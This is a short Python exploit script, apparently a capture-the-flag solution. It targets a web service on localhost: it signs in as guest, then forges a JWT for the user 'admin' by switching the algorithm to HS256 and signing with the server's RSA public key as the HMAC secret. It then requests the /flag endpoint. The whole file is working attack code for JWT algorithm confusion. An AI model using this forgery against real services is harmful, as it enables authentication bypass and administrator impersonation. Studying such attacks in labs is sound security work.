import requests
import json
import base64
import hmac
import hashlib

HOST = "http://localhost:5503"

pubkey = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3NcjHBbKAAhJd6P+TviV
h/WRXtxtKBJLPQYIlmZ/I35WlQLpNXR9Q0YiQLMNW0E3MTHISQlQE5hBF8S2Z2tC
0SmiAMr3QQjaIA3vmefA/CXSp4YjIbKz75Nwzczk7spYiVwEbYoLOpovnl+KB6Tj
XJWCFXvgpL6xYu9Se8msgqVIl+cWANlmPdBuDRvF/7KUboHsdZsn1mL88JoTnk9u
sVp9PP+bpbcFEzwzfS+YkjwUhXFHHNPqsu9eKZZlpkRbl3lZzzxgX4G/bh3BkaCO
wp4Pv1ptk8NJH8N96USDw3Lpgc6wGReoyCBY7Dtg1a3IHNjQQwQg+rd+1yUUfPAe
qa9MbLWr3hYQn+9G4SxTwmWptGJLLjZMzfELtGxiZTHlnifP4nHSNJ8WdGJ63YU9
7LiwkWsE8BVIPi+f/oNIbhhgJzGSD57mkdN0wNloN0I+83/0g2TnVSvkSM5ow/E9
h2w/qaT9LfjtYiZbFFc95lwcaR1nUO/hmZ2okTt7Nh5tlefbvHNSyHMFuvTiEanI
xO2kJIXugy9h9pNAX8jlNHNQWT1WM5HI3t8aMcsucjOT9wTWh7Hl0qxrO4f7f2kP
HODGSRQ/uR9czPYtXP4HPAPUToZ9Xzc5Voj3Q/bzRcAnkKH6fmUOtLPd2XhTDTFl
A5kHBxj92CnlYq6/bQdXDy0CAwEAAQ==
-----END PUBLIC KEY-----"""

data = {
    "username": "guest",
    "password": "guest"
}

# /signin
signin_response = requests.post(f"{HOST}/signin", json=data)
print("/signin:", signin_response.text)
encoded_jwt = signin_response.headers['Authorization']
print("encoded jwt:", encoded_jwt)

# alg: HS256なJWTを作成
header = {
    "alg": "HS256",
    "typ": "JWT"
}

# Base64 encode the header and payload
encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode('utf-8')
encoded_payload = base64.urlsafe_b64encode(json.dumps({"username": "admin"}).encode()).rstrip(b'=').decode('utf-8')

# Create the signature
message = f"{encoded_header}.{encoded_payload}"
signature = hmac.new(pubkey.encode(), message.encode(), hashlib.sha256)
encoded_signature = base64.urlsafe_b64encode(signature.digest()).rstrip(b'=').decode('utf-8')

# Combine to form the JWT
hs256_jwt = f"{encoded_header}.{encoded_payload}.{encoded_signature}"
print("HS256 jwt:", hs256_jwt)

# /flag
flag_response = requests.get(f"{HOST}/flag", headers={"Authorization": hs256_jwt})
print("/flag", flag_response.text)
